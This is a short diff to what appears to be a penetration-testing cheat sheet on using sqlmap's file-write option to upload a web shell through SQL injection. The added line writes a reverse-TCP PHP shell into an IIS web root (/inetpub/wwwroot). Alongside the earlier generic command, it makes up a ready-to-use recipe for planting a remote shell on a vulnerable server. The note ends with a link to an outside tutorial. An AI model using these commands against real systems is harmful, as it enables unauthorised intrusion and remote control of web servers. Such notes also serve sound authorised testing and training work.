@@ -1,6 +1,7 @@
 Prepare your web shell and understand where the destination of where you can write files to
 
 sqlmap -u URL --file-write=/path/to/shell --file-dest=/location/of/destination --batch
+sqlmap -r ./request --file-write=/path/to/reversetcp.php --file-dest=/inetpub/wwwroot/reversetcp.php --batch
 
 More information Regarding File upload on SQLMAP:
 https://www.hackingarticles.in/file-system-access-on-webserver-using-sqlmap/
